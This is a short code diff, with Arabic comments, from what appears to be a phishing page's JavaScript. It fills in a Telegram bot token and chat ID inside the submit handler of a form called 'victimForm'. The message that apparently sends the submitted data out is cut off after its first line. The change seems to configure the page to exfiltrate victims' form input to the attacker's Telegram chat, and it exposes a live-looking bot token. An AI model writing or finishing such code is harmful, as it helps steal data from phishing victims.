@@ -29,8 +29,8 @@ victimForm.addEventListener("submit", (e) => {
   const type = document.getElementById("type").value;
 
   // معلومات البوت
-  const botToken = "YOUR_BOT_TOKEN"; // ضع توكن البوت هنا
-  const chatId = "YOUR_CHAT_ID";     // ضع Chat ID هنا
+  const botToken = "7808129262:AAGhZRKa_JHk1SQObAhJ4SzfJT8Mnq7-pI8"; // ضع توكن البوت هنا
+  const chatId = "7499043737";     // ضع Chat ID هنا
 
   // الرسالة التي سيتم إرسالها
   const message = `
